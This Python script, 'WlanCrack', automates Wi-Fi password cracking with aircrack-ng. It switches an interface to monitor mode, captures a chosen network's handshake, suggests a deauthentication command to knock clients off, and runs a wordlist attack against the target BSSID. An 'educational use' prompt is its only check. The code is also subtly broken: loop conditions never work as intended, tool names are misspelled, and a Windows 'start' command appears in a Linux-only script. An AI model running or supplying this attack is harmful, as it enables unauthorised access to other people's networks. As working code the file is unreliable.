import os
import time
import platform
import subprocess
import netifaces
import webbrowser

clear = lambda: os.system('clear')

print("Ellie, do you want to Auto-Update? [y/n]")

updateagreeinput = input()

if updateagreeinput == "y" or updateagreeinput == "Y":
    print("This can take some time....")
    os.system("git pull origin master")
    print("\nDear Customer,\nplease restart this program.\nSorry for any inconveniences.")
    quit()

print("\033[0;0;32mWelcome to the WlanCrack automatic script. Made by ToLegit & MikeMaschine.\nIf you want to quit press simply CTRL and C. Please follow the steps.\nHave a nice day. \033[0m\n")

print("Do you agree that this script is only for educational use? [y/n]")

agreeinput = input()

if agreeinput != "y" and agreeinput != "Y":
    print("How dare you?")
    webbrowser.open('https://www.youtube.com/watch?v=TMrtLsQbaok&t=56')
    quit()

print("I hope it for you.\n")

if platform.system() != "Linux":
    print("You can run this script only on Linux based devices.")
    quit()

time.sleep(0.2)

clear()

print("Here are your interfaces:")
os.system("iwconfig")

print("Please enter your interface name. \nDefault: wlan0")

wlaninput = input()

if wlaninput == "":
    wlaninput = "wlan0"

def is_interface_up(interface1):
    interface_list = netifaces.interfaces()
    if interface1 in interface_list:
        return True
    return False

print("\n" + str(is_interface_up(wlaninput)))

while not is_interface_up(wlaninput):
    print("Interface not found or is not online.")
    wlaninput1 = input()
    if wlaninput1 == "":
        wlaninput1 = "wlan0"
    wlaninput = wlaninput1

clear()

print("Select mode:\n[1] Airmon-ng mode\n[2] Iwconfig mode\n[3] Ifconfig Down/Up")

mode = input()

while mode != "1" and not "2" and not "3":
    print("Select mode:\n[1] Airmon-ng mode\n[2] Iwconfig mode\n[3] Ifconfig Down/Up")
    modenew = input()
    mode = modenew

if mode == "1":
    os.system("airmon-ng check kill")
    time.sleep(0.2)
    os.system("airmon-ng start " + wlaninput )
    time.sleep(0.2)
elif mode == "2":
    os.system("airmon-ng check kill")
    time.sleep(0.2)
    os.system("iwconfig " + wlaninput + " mode monitor")
    time.sleep(0.2)
elif mode == "3":
    os.system("airmon-ng check kill")
    time.sleep(0.2)
    os.system("ifconfig "+wlaninput+" down")
    time.sleep(0.2)
    os.system("iwconfig " + wlaninput + " mode monitor")
    time.sleep(0.2)
    os.system("ifconfig "+wlaninput+" up")
    time.sleep(0.2)

clear()

os.system("iwconfig " + wlaninput)

print("Is the interface in monitor mode? [y/n]")

interfacecheck = input()

times = 0

while True:
    if interfacecheck != "y" and interfacecheck != "Y":
        if times >= 5:
            clear()
            print("Do you want to switch the mode? [y/n]")
            question = input()
            if question == "y" or question == "Y":
                print("Select mode:\n[1] Airmon-ng mode\n[2] Iwconfig mode\n[3] Ifconfig Down/Up")

                mode88 = input()

                while mode88 != "1" and not "2" and not "3":
                    print("Select mode:\n[1] Airmon-ng mode\n[2] Iwconfig mode\n[3] Ifconfig Down/Up")
                    modenew = input()
                    mode = modenew

                times = 0
                continue
            else:
                times = 0
                continue
        if mode == "1":
            os.system("airmon-ng check kill")
            time.sleep(0.2)
            os.system("airmon-ng start " + wlaninput )
            time.sleep(0.2)
        elif mode == "2":
            os.system("airmon-ng check kill")
            time.sleep(0.2)
            os.system("iwconfig " + wlaninput + " mode monitor")
            time.sleep(0.2)
        elif mode == "3":
            os.system("airmon-ng check kill")
            time.sleep(0.2)
            os.system("ifconfig "+wlaninput+" down")
            time.sleep(0.2)
            os.system("iwconfig " + wlaninput + " mode monitor")
            time.sleep(0.2)
            os.system("ifconfig "+wlaninput+" up")
            time.sleep(0.2)

        os.system("iwconfig " + wlaninput)

        print("Is the interface now in monitor mode? [y/n]")

        interfacecheck1 = input()

        interfacecheck = interfacecheck1

        times = times + 1
    else:
        break

clear()

print("Do you want to crack a wifi password now? [y/n]")
crack = input()

if crack != "y" and crack != "Y":
    print("Thank you for using this tool.\nBye.")
    webbrowser.open('https://www.youtube.com/watch?v=oOlft8xFdlY')

clear()

print("Instuction:\nPlease select a wifi network from the now listed wifi networks.\n!IMPORTANT!\n Please save the bssid, channel and optionaly the wifi name.\nIf you find your Network press CTRL + C\nThis script will automatically keep going after 5 seconds.")
time.sleep(5)

subprocess.call("start /wait airodump-ng " + wlaninput, shell=True)

print("Please enter of the network the bssid")

bssid = input()

while bssid == "":
    print("Please enter of the network the bssid") 
    bssid = input()

print("\nPlease enter of the network the channel")

channel = input()

while channel == "":
    print("Please enter of the network the channel") 
    channel = input()

clear()

print("Instuction:\nPlease wait for incomming connections.\n!IMPORTANT!\nIf didn't incomming connections come in open a new Terminal and write 'aireply-ng --deauth 5 -a [your_bssid] -c [your_channel]' \n\nIf you find your Network press CTRL + C\nThis script will automatically keep going after 5 seconds.")
time.sleep(5)

clear()
subprocess.call("start /wait airodump -c "+channel+" --bssid " + bssid + " -w record.cap " + wlaninput, shell=True)

clear()

print("Select Mode \n[1]Wordlist\n[2]Random generated words (In work)")
modecrack = input()

while modecrack != "1" or modecrack != "2":
    print("Select Mode \n[1]Wordlist\n[2]Random generated words")
    modecrack = input()

if modecrack == "1":
    print("Please enter the full path of your wordlist file")
    path = input()
    while not os.path.isfile(path):
        print("File not found.")
        print("Please enter the full path of your wordlist file")
        path = input()
    
    clear()

    print("Enter the name of the saved connection file")
    time.sleep(1.5)
    clear()
    os.system("ls")
    cfile = input()
    while not os.path.isfile(cfile):
        print("Enter the name of the saved connection file")
        time.sleep(1.5)
        clear()
        os.system("ls")
        cfile = input()

    clear()

    print("Trying to start cracking. This can take some time....")

    result = subprocess.run("aircrack-ng -w " + path + " -b " + bssid + " " + cfile, stdout=subprocess.PIPE).stdout.decode('utf-8')

    if "No valid WPA handshakes found" in result:
        print("Failed to find handshakes.\nPlease restart the script")
        quit()
    quit()

elif modecrack == "2":
    quit()